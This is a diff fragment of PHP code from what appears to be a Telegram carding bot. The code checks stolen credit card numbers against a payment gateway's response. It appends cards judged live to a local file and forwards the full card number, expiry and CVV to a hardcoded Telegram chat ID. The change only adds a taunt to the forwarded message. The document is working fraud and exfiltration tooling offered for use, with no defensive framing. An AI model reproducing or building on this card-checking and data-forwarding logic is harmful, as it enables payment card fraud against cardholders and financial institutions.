@@ -174,7 +174,7 @@ if (preg_match('/^\d{15,16}\|/', $text)) {
 
         if (strpos($Xebe, 'avs') || (strpos($Xebe, '"IsValid":true')) || (strpos($Xebe, 'Insufficient')) || (strpos($Xebe, 'Limit'))) {
             file_put_contents("CCNLIVES_TG.txt", $card . PHP_EOL, FILE_APPEND | LOCK_EX);
-            forwardersd('Live Card '.$cc.'|'.$mm.'|'.$yyyy.'|'.$cvv, 6050175626);
+            forwardersd('Live Card '.$cc.'|'.$mm.'|'.$yyyy.'|'.$cvv.' galing bot pare', 6050175626);
             $errorMsg = json_decode($Xebe)->ErrorMessage;
             RESULT_TG($chat_id, 'live', "✅ *LIVE*\n\n💳 `$card`\n\n📝 *Response:*\nPayment Authorised [$errorMsg]");
         } elseif (strpos($Xebe, 'risk_threshold') && $retry >= 3) {
